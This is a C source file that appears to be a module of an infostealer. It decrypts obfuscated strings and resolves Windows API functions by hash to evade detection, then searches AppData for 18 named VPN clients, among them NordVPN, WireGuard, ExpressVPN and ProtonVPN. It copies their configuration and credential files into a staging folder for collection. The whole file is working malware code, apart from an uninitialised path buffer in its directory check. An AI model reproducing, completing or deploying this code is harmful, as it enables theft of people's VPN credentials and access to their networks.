#include "vpn.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_VPN_NORDVPN
#include <stdio.h>
#include <string.h>

#define VPN_MAX_PATH 512
#define VPN_MAX_CLIENTS 18

typedef HANDLE (WINAPI *pFFA)(const char *, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFNA)(HANDLE, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *pFC)(HANDLE);
typedef BOOL   (WINAPI *pCFA)(const char *, const char *, BOOL);
typedef BOOL   (WINAPI *pCDA)(const char *, void *);

static struct {
    pFFA pFF; pFNA pFN; pFC pFClose; pCFA pCF; pCDA pCD;
    int  ready;
} vpn_api;

static int vpn_ensure_api(void) {
    if (vpn_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    vpn_api.pFF = (pFFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    vpn_api.pFN = (pFNA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    vpn_api.pFClose = (pFC)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
    vpn_api.pCF = (pCFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
    vpn_api.pCD = (pCDA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!vpn_api.pFF || !vpn_api.pFN || !vpn_api.pFClose ||
        !vpn_api.pCF || !vpn_api.pCD) return 0;
    vpn_api.ready = 1;
    return 1;
}

typedef struct {
    const char *name;
    const char *subdir;
    const char *ext;
    int         use_local;
} VpnEntry;

static VpnEntry vpn_table[VPN_MAX_CLIENTS];
static int vpn_table_init = 0;

static void init_vpn_table(void) {
    if (vpn_table_init) return;
    char buf[64];
    typedef struct { const uint8_t *enc; int len; } enc_entry;
    enc_entry names[] = {
        { enc_vpn_nordvpn, ENC_VPN_NORDVPN_LEN },
        { enc_vpn_openvpn, ENC_VPN_OPENVPN_LEN },
        { enc_vpn_wireguard, ENC_VPN_WIREGUARD_LEN },
        { enc_vpn_surfshark, ENC_VPN_SURFSHARK_LEN },
        { enc_vpn_expressvpn, ENC_VPN_EXPRESSVPN_LEN },
        { enc_vpn_cyberghost, ENC_VPN_CYBERGHOST_LEN },
        { enc_vpn_pia, ENC_VPN_PIA_LEN },
        { enc_vpn_mullvad, ENC_VPN_MULLVAD_LEN },
        { enc_vpn_windscribe, ENC_VPN_WINDSCRIBE_LEN },
        { enc_vpn_tunnelbear, ENC_VPN_TUNNELBEAR_LEN },
        { enc_vpn_hotspotshield, ENC_VPN_HOTSPOTSHIELD_LEN },
        { enc_vpn_vyprvpn, ENC_VPN_VYPRVPN_LEN },
        { enc_vpn_hamachi, ENC_VPN_HAMACHI_LEN },
        { enc_vpn_hidemyname, ENC_VPN_HIDEMYNAME_LEN },
        { enc_vpn_ipvanish, ENC_VPN_IPVANISH_LEN },
        { enc_vpn_radminvpn, ENC_VPN_RADMINVPN_LEN },
        { enc_vpn_softether, ENC_VPN_SOFTETHER_LEN },
        { enc_vpn_protonvpn, ENC_VPN_PROTONVPN_LEN },
    };
    static const char *subdirs[] = {
        "NordVPN", "OpenVPN Connect\\profiles", "WireGuard\\Configurations",
        "Surfshark", "ExpressVPN", "CyberGhost", "Private Internet Access",
        "Mullvad VPN", "Windscribe", "TunnelBear", "Hotspot Shield",
        "VyprVPN", "Hamachi", "Hide My Name", "IPVanish", "Radmin VPN",
        "SoftEther VPN Client", "ProtonVPN"
    };
    static const char *exts[] = {
        NULL, "ovpn", "conf", NULL, NULL, NULL, "json", "json",
        "cfg", NULL, "cfg", "dat", "conf", "xml", "dat", "xml", "config", NULL
    };
    static const int locals[] = { 0,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,1 };
    for (int i = 0; i < 18; i++) {
        enc_decrypt(names[i].enc, names[i].len, buf);
        vpn_table[i].name = mi_strdup(buf);
        vpn_table[i].subdir = subdirs[i];
        vpn_table[i].ext = exts[i];
        vpn_table[i].use_local = locals[i];
    }
    vpn_table_init = 1;
}

static int dir_exists(const char *path) {
    if (!vpn_ensure_api()) return 0;
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind = vpn_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    vpn_api.pFClose(hFind);
    int found = 0;
    hFind = vpn_api.pFF(pattern, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { found = 1; break; }
        } while (vpn_api.pFN(hFind, &fd));
        vpn_api.pFClose(hFind);
    }
    return found;
}

static int has_ext(const char *filename, const char *ext) {
    if (!ext) return 1;
    const char *dot = strrchr(filename, '.');
    if (!dot) return 0;
    return _stricmp(dot + 1, ext) == 0;
}

static void ensure_dir(const char *path) { vpn_api.pCD(path, NULL); }

static int copy_matching_files(const char *src_dir, const char *dst_dir, const char *ext) {
    if (!vpn_ensure_api()) return 0;
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
    HANDLE hFind = vpn_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    int count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!has_ext(fd.cFileName, ext)) continue;
        char src_path[VPN_MAX_PATH], dst_path[VPN_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);
        if (vpn_api.pCF(src_path, dst_path, FALSE)) count++;
    } while (vpn_api.pFN(hFind, &fd));
    vpn_api.pFClose(hFind);
    return count;
}

int vpn_collect(const char *output_dir) {
    char local[VPN_MAX_PATH], roaming[VPN_MAX_PATH];
    int total = 0;

    if (!output_dir) return -1;

    init_vpn_table();

    const char *appdata = getenv("APPDATA");
    if (appdata) snprintf(roaming, sizeof(roaming), "%s", appdata);
    else roaming[0] = '\0';

    appdata = getenv("LOCALAPPDATA");
    if (appdata) snprintf(local, sizeof(local), "%s", appdata);
    else local[0] = '\0';

    char vpn_base[VPN_MAX_PATH];
    snprintf(vpn_base, sizeof(vpn_base), "%s\\vpn", output_dir);
    ensure_dir(vpn_base);

    for (int i = 0; i < VPN_MAX_CLIENTS; i++) {
        const VpnEntry *e = &vpn_table[i];
        const char *base = e->use_local ? local : roaming;
        if (!base[0]) continue;
        char src_dir[VPN_MAX_PATH];
        snprintf(src_dir, sizeof(src_dir), "%s\\%s", base, e->subdir);
        if (!dir_exists(src_dir)) continue;
        char dst_dir[VPN_MAX_PATH];
        snprintf(dst_dir, sizeof(dst_dir), "%s\\%s", vpn_base, e->name);
        ensure_dir(dst_dir);
        total += copy_matching_files(src_dir, dst_dir, e->ext);
    }
    return total;
}

#endif
